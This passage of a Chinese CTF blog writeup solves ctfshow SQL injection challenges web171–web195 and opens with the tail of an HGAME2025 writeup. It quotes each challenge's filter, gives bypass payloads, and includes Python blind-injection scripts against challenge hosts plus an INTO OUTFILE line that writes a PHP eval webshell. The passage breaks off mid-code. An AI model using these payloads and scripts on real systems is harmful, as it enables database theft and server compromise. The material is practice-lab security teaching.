src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025-Web-Writeup"},{"content":"无过滤注入（对输出内容进行过滤） web171 $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; flag是存在于username为flag的用户的数据中，我们只需要通过\n1\u0026#39; or 1=1 --+ 即可输出所有用户数据\nweb172 相比上一题，这题增加了过滤\n//检查结果是否有flag\rif($row-\u0026gt;username!==\u0026#39;flag\u0026#39;){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r} 方法一: 联合查询\n因为联合查询只会显示password\napi/?id=1\u0026#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23\r/api/?id=1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ctfshow_web\u0026#39;),database()%23\r/api/?id=1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;ctfshow_web\u0026#39; and table_name=\u0026#39;ctfshow_user\u0026#39;),database()%23\r//看到有3列 id,username,password\r/api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23\r//查询password发现没有flag\r//查另一个表 ctfshow_user2\r/api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23\r//看到flag 方法二: 将用户名字段进行编码，绕过检测\n-1\u0026#39; union select to_base64(username),password from ctfshow_user2 --+ 方法三: 只查询密码\n-1\u0026#39; union select id,password from ctfshow_user2 where username=\u0026#39;flag web173 过滤要求查询结果中不能出现flag字段\n//检查结果是否有flag\rif(!preg_match(\u0026#39;/flag/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r} 方法一：联合查询\n和上题解法一样，只是这题flag在ctfshow_user3\n方法二：\n只查询password\n-1\u0026#39; union select id,id,password from ctfshow_user3 where username=\u0026#39;flag 方法三: 将用户名字段进行编码，绕过检测\n-1\u0026#39; union select to_base64(username),password from ctfshow_user3 --+ web174 输出时增加了过滤数字\n//检查结果是否有flag和数字\rif(!preg_match(\u0026#39;/flag|[0-9]/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r} 由于flag中含有数字，哪怕像之前的通过to_base64等编码后，仍然不可避免数字的出现\n所以这题我们要用到布尔盲注\n放个脚本\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))\u0026gt;{mid},1,0) -- -\u0026#39; 17 r = requests.get(url + payload) 18 if \u0026#34;admin\u0026#34; in r.text: 19 head = mid + 1 20 else: 21 tail = mid 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 又或者通过replace方法将数字替换成其他的合法字符\n1\u0026#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,\u0026#39;A\u0026#39;),2,\u0026#39;B\u0026#39;),3,\u0026#39;C\u0026#39;),4,\u0026#39;D\u0026#39;),5,\u0026#39;E\u0026#39;),6,\u0026#39;F\u0026#39;),7,\u0026#39;G\u0026#39;),8,\u0026#39;H\u0026#39;),9,\u0026#39;I\u0026#39;),0,\u0026#39;J\u0026#39;),\u0026#39;b\u0026#39; from ctfshow_user4 where username=\u0026#39;flag\u0026#39; %23 拿到flag后替换回去就行\n1import base64 2 3flag64 = \u0026#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}\u0026#34; 4 5flag = flag64.replace(\u0026#34;A\u0026#34;, \u0026#34;1\u0026#34;).replace(\u0026#34;B\u0026#34;, \u0026#34;2\u0026#34;).replace(\u0026#34;C\u0026#34;, \u0026#34;3\u0026#34;).replace(\u0026#34;D\u0026#34;, \u0026#34;4\u0026#34;).replace(\u0026#34;E\u0026#34;, \u0026#34;5\u0026#34;).replace(\u0026#34;F\u0026#34;, \u0026#34;6\u0026#34;).replace(\u0026#34;G\u0026#34;, \u0026#34;7\u0026#34;).replace(\u0026#34;H\u0026#34;, \u0026#34;8\u0026#34;).replace(\u0026#34;I\u0026#34;, \u0026#34;9\u0026#34;).replace(\u0026#34;J\u0026#34;, \u0026#34;0\u0026#34;) 6 7print(flag) 又或者\n1\u0026#39; union select 1,\u0026#34;\u0026lt;?=eval($_POST[1]);?\u0026gt;\u0026#34; into outfile \u0026#34;/var/www/html/shell.php\u0026#34; --+ web175 //检查结果是否有flag\rif(!preg_match(\u0026#39;/[\\x00-\\x7f]/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r}\r检查变量 $ret 经过 json_encode 编码后的结果中是否只包含 ASCII 字符（即字符编码范围在 \\x00 到 \\x7f 之间）。如果不满足这个条件，就将 $ret 数组中的 msg 键的值设置为 '查询成功'。\n也就是没有任何回显\n方法一：时间盲注\n大佬的脚本，用的二分法\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))\u0026gt;{mid},sleep(2),0) -- -\u0026#39; 17 try: 18 r = requests.get(url + payload, timeout=0.5) 19 tail = mid 20 except Exception as e: 21 head = mid + 1 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 方法二:利用读写文件写入网站根目录 http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1' union select 1,password from ctfshow_user5 into outfile \u0026lsquo;/var/www/html/1.txt\u0026rsquo;\u0026ndash;+\u0026amp;page=1\u0026amp;limit=10 之后访问http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt\n过滤注入（对传入参数进行过滤） web176 //对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} 方法一：万能钥匙\n1\u0026#39; or 1=1--+ 能找到flag\n方法二:大小写绕过\n1\u0026#39; uNion sElect 1,2,password from ctfshow_user --+ web177 黑名单：空格、+\n空格替代：%20（普通空格）、%09（水平制表符）、%0a（换行符）、%0b（回车符）、%0c（新一页）、%0d（垂直制表符）、%a0、()、``、\\**\\\n可以用\\**\\绕过\n1\u0026#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=\u0026#39;flag\u0026#39;%23 方法二:万能钥匙\nweb178 黑名单增加：%20、*\n1\u0026#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=\u0026#39;flag\u0026#39;%23 方法二:万能钥匙\nweb179 黑名单增加：%09、%0a、%0b、%0d\n这题把%09也过滤了，这题空格可以用%0c绕过\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23 web180 黑名单增加：#\n可以用\u0026ndash;%0c代替#(%23)\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c 或者直接万能密码\nid=-1\u0026#39;or(id=26)and\u0026#39;1\u0026#39;=\u0026#39;1 web181 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i\u0026#39;, $str); 4 } / 和 /i：正则表达式的定界符，/ 表示正则表达式的开始和结束，i 是修饰符，表示不区分大小写进行匹配。\n|\\*：匹配空格字符（）和星号（*），这两个字符在 SQL 注入中可能会被用于构造恶意语句。\n\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0\n：分别匹配不同的 ASCII 控制字符和特殊空白字符，例如：\n\\x09：水平制表符（Tab） \\x0a：换行符（LF） \\x0b：垂直制表符 \\x0c：换页符 \\x00：空字符 \\x0d：回车符（CR） \\xa0：不间断空格 \\x23|\\#：匹配井号（#），在 SQL 中，# 通常用于注释，攻击者可能会利用注释来绕过 SQL 语句的检查。\nfile|into|select：匹配关键字 file、into 和 select，这些关键字在 SQL 注入和文件包含攻击中经常被使用。\n方法一 用like来匹配关键词flag\n-1\u0026#39;%0cor%0cusername%0clike%0c\u0026#39;flag 方法二\n-1\u0026#39;or(id=26)and\u0026#39;1 看到一篇大佬的文章，感觉明了不少\nctfshow Web入门SQL注入 web171-197 Writeup - X1r0z Blog\nweb182 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i\u0026#39;, $str); 4 } 黑名单增加：flag\n这题可以用到like进行模糊查询\npayload:\n-1\u0026#39;or%0cusername%0clike%0c\u0026#39;fl% 或者继续使用上一题的方法二\nweb183 查询语句\n//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select count(pass) from \u0026#34;.$_POST[\u0026#39;tableName\u0026#39;].\u0026#34;;\u0026#34;; 返回逻辑\n//对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i\u0026#39;, $str);\r} 查询结果\n//返回用户表的记录总数\r$user_count = 0; 题目大概的意思就是我们传入表名进行查询，如果表名正确，就会返回用户表记录总数1，如果表名错误则返回0，且每次最多只会返回1，根据这个我们可以尝试布尔盲注，如果我们知道表名(ctfshow_user)和列名(pass)，我们就能通过布尔盲注拿到flag\nY4tacker大佬的脚本\nimport requests\rurl = \u0026#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php\u0026#39;\rstr = r\u0026#34;{abcdefghijklmnopqrstuvwsyz-0123456789}\u0026#34;\rflag = \u0026#34;\u0026#34;\rindex = 0\rwhile True:\rfor i in str:\rdata = {\r\u0026#39;tableName\u0026#39;: f\u0026#34;(ctfshow_user)where(substr(pass,{index},1))regexp(\u0026#39;{i}\u0026#39;)\u0026#34;\r}\rr = requests.post(url, data=data)\rif r.text.find(\u0026#34;$user_count = 1;\u0026#34;) \u0026gt; 0:\rflag += i\rprint(flag)\rbreak\rindex += 1 不是为什么我flag的马甲是这样的\nweb184 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str); 4 } 因为这题where被ban了，我们可以利用right join进行代替\n依旧是布尔盲注\nPOC\nimport requests\rurl = \u0026#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php\u0026#39;\rcharset = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\u0026#39;\rflag = \u0026#39;\u0026#39;\rfor i in range(1, 50): # 假设 flag 最长 50 个字符\rfor j in charset:\rpayload = f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))\u0026#34;\rdata = {\r\u0026#39;tableName\u0026#39;: payload\r}\rresponse = requests.post(url, data=data)\rif \u0026#34;some_success_condition\u0026#34; in response.text:\rflag += j\rprint(flag)\rbreak web185 //对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str);\r} 这题把数字ban掉了\n这其实就导致了我们在构造payload的时候没办法直接使用数字\n但是我们可以用true来代替构造出数字\n我们知道true = 1\n那2就可以用true+true来表示，以此类推\n1import requests 2url = \u0026#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php\u0026#34; 3flag = \u0026#39;\u0026#39; 4 5 6def createNum(n): 7 num = \u0026#39;true\u0026#39; 8 if n == 1: 9 return \u0026#39;true\u0026#39; 10 else: 11 for i in range(n - 1): 12 num += \u0026#34;+true\u0026#34; 13 return num 14 15 16for i in range(45): 17 if i \u0026lt;= 5: 18 continue 19 for j in range(127): 20 data = { 21 \u0026#34;tableName\u0026#34;: f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))\u0026#34; 22 } 23 r = requests.post(url, data=data) 24 if r.text.find(\u0026#34;$user_count = 43;\u0026#34;) \u0026gt; 0: 25 if chr(j) != \u0026#34;.\u0026#34;: 26 flag += chr(j) 27 28 print(\u0026#34;[*]result is:\u0026#34;+flag.lower()) 29 if chr(j) == \u0026#34;}\u0026#34;: 30 exit(0) 31 break web186 //对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\\u0026lt;|\\\u0026gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str);\r} 解法和上题一样\nweb187 返回逻辑\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = md5($_POST[\u0026#39;password\u0026#39;],true);\r//只有admin可以获得flag\rif($username!=\u0026#39;admin\u0026#39;){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名不存在\u0026#39;;\rdie(json_encode($ret));\r}\rpassword=md5($pass,true)绕过、弱类型、MD5强碰撞_select * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,tru-CSDN博客\npayload:\nadmin/ffifdyop 抓个包\nweb188 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; 返回逻辑\r//用户名检测\rif(preg_match(\u0026#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\\u0026#39;|\\\u0026#34;/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;;\rdie(json_encode($ret));\r}\r//密码检测\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;;\rdie(json_encode($ret));\r}\r//密码判断\rif($row[\u0026#39;pass\u0026#39;]==intval($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;;\rarray_push($ret[\u0026#39;data\u0026#39;], array(\u0026#39;flag\u0026#39;=\u0026gt;$flag));\r}\rctfshow-sql注入-超详解(172-200)_ctfshow 172-CSDN博客\n所以payload为\n0/0\r或者\r1||1/0 https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v\nweb189 //拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; //用户名检测\rif(preg_match(\u0026#39;/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;;\rdie(json_encode($ret));\r}\r//密码检测\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;;\rdie(json_encode($ret));\r}\r//密码判断\rif($row[\u0026#39;pass\u0026#39;]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;;\r}\r这题在输入0/0的时候会显示密码错误，而在输入1/0的时候则会显示查询错误\n可以通过这个来进行布尔盲注，即正确时系统返回查询错误，错误时系统返回密码错误\n1# -*- coding: utf-8 -*- 2# @Author : Yn8rt 3# @Time : 2021/7/30 15:48 4# @Function: 5import requests 6import sys 7import json 8 9url = \u0026#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/\u0026#39; 10flag = \u0026#39;ctfshow{\u0026#39; 11letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-{}\u0026#39; 12 13for i in range(100): 14 for j in letter: 15 payload = { 16 \u0026#34;username\u0026#34;: \u0026#34;if(load_file(\u0026#39;/var/www/html/api/index.php\u0026#39;)regexp(\u0026#39;{}\u0026#39;),0,1)\u0026#34;.format(flag + j), 17 \u0026#34;password\u0026#34;: \u0026#34;0\u0026#34; 18 19 } 20 r = requests.post(url=url,data=payload) 21 #print(r) 22 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 23 flag += j 24 print(flag) 25 break 26 if \u0026#39;}\u0026#39; in flag: 27 sys.exit() web190 查询语句\n//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;;\r返回逻辑\n//密码检测\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;;\rdie(json_encode($ret));\r}\r//密码判断\rif($row[\u0026#39;pass\u0026#39;]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;;\r}\r//TODO:感觉少了个啥，奇怪\r所以这题依旧可以进行布尔盲注\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查数据库 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查字段 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # 查flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web191 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 这题和上题一样，只是加了点ban掉了ascii\n我们用ord代替ascii即可\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查数据库 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查字段 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # 查flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ord(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web192 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 不给我转是吧，那我不转了\n1import requests 2import string 3 4url = \u0026#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/\u0026#34; 5flagstr=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 6flag = \u0026#39;\u0026#39; 7for i in range(1,45): 8 for j in flagstr: 9 payload = f\u0026#34;admin\u0026#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp(\u0026#39;{j}\u0026#39;),1,2)=\u0026#39;1\u0026#34; 10 data = { 11 \u0026#39;username\u0026#39;: payload, 12 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 13 } 14 r = requests.post(url, data=data) 15 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 16 flag += j 17 print(flag) 18 if \u0026#34;}\u0026#34; in flag: 19 exit(0) 20 break 其实也差不多\n二分法脚本\n1 2# 用了二分法 dejavu~~~ 3import requests 4 5url = \u0026#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/\u0026#34; 6# 表名 CtFsHOw{FL0G,CtFsHOw{usEr 7# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 8# 列名 ID,F1AG,ID,usErNAME,pAss 9# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 10# flag 11payload = \u0026#34;0\u0026#39; or if(substr((select f1ag from ctfshow_fl0g),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 12true_flag = \u0026#34;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\u0026#34; 13result = \u0026#34;\u0026#34; 14index = 1 15while True: 16 start = 32 17 end = 127 18 while not (abs(start-end) == 1 or start == end): 19 p = (start + end) // 2 20 data = { 21 \u0026#34;username\u0026#34;: payload.format(index, chr(p)), 22 \u0026#34;password\u0026#34;: 0 23 } 24 response = None 25 while True: 26 try: 27 response = requests.post(url, data=data) 28 except: 29 continue 30 break 31 if true_flag in response.text: 32 start = p 33 else: 34 end = p 35 if end \u0026lt; start: 36 end = start 37 result += chr(end) 38 print(f\u0026#34;[*] result: {result}\u0026#34;) 39 index += 1 web193 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 新增waf：substr\n没办法进行截断，但其实问题不大\n1import requests 2import sys 3url = \u0026#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/\u0026#39; 4result = \u0026#39;\u0026#39; 5letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-_,{}\u0026#39; 6 7for i in range(100): 8 for j in letter: 9 # 查表 10 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 11 # 查字段 12 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 13 # 查flag 14 payload = \u0026#34;select group_concat(f1ag) from ctfshow_flxg\u0026#34; 15 16 data={ 17 \u0026#39;username\u0026#39;:\u0026#34;admin\u0026#39; and if(({}) like \u0026#39;{}%\u0026#39;,1,2) =\u0026#39;1\u0026#34;.format(payload,result+j), 18 \u0026#39;password\u0026#39;:1 19 } 20 res = requests.post(url=url,data=data) 21 if \u0026#34;密码错误\u0026#34; == res.json()[\u0026#39;msg\u0026#39;]: 22 result += j 23 print(result) 24 break 25 if \u0026#34;}\u0026#34; in result: 26 exit(0) 我们可以用like来达到差不多的效果\n这题也可以用char,left,right,substring之类的方法\nweb194 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 新增waf：char|left|right|substring\n上题的方法依旧适用\nweb195 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 20 if(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 24 25 if($row[0]==$password){ 26 